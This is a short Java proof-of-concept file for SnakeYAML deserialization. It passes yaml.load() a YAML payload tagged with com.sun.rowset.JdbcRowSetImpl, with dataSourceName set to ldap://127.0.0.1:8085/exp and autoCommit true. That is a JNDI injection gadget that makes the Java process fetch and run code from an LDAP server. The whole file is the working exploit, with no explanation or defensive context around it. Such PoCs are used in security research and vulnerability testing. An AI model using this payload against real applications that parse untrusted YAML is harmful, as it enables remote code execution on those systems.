import org.yaml.snakeyaml.Yaml;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2024/12/18
 */
public class SnakeYaml_JdbcRowSetImpl {
    public static void main(String[] args) {
        String poc = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://127.0.0.1:8085/exp, autoCommit: true}";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}
